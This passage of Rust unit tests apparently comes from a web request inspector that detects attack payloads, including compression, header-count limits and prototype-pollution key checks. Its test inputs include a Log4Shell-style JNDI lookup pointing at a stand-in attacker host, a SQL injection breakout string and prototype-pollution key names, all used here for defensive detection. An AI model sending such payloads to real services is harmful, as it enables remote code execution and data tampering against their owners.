        let mut out = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        out.write_all(br#"{"q":"${jndi:ldap://evil.example/a}"}"#).unwrap();
        assert_eq!(inspect(b"", &out.finish().unwrap()).as_deref(), Some("rce_jndi_lookup"));
        // A form body that only starts like zlib, as in x^2=4, is read as it is.
        assert_eq!(inspect(b"", b"x^2=4&note=fine"), None);
        let headers = |count: usize, last: &str| {
            let mut pairs: Vec<(String, String)> = (0..count).map(|i| (format!("x-pad-{i}"), "ordinary".into())).collect();
            pairs.push(("x-last".into(), last.into()));
            crate::payload::inspect_sql_headers(pairs.iter().map(|(n, v)| (n.as_str(), v.as_str())), 65536)
        };
        // Past 64 headers is still checked; past 256 is refused, not let through.
        assert_eq!(headers(100, "1' OR '1'='1").map(|f| f.0).as_deref(), Some("sql_breakout_single_quote"));
        assert_eq!(headers(100, "ordinary"), None);
        assert_eq!(headers(300, "ordinary").map(|f| f.1), Some(413));
        let cookies = (0..300).map(|i| format!("c{i}=v")).collect::<Vec<_>>().join("; ");
        assert_eq!(crate::payload::inspect_sql_headers([("cookie", cookies.as_str())], 65536).map(|f| f.1), Some(413));
    }

    #[test]
    fn polluting_keys() {
        for name in ["__proto__", "a[__proto__][b]", "__proto__.x", "constructor[prototype][x]", "a.constructor.prototype"] {
            assert!(super::polluting_key(name), "{name}");
        }
        for name in ["proto", "prototype", "constructor", "my__proto__", "product[prototype]", "prototype.constructor"] {
            assert!(!super::polluting_key(name), "{name}");
        }
    }

    #[test]
    fn long_values_are_checked_by_their_start() {
        let long = format!("${{jndi:ldap://x}}{}", "a".repeat(40_000));
        assert_eq!(classify(&long), Some("rce_jndi_lookup"));
    }
}

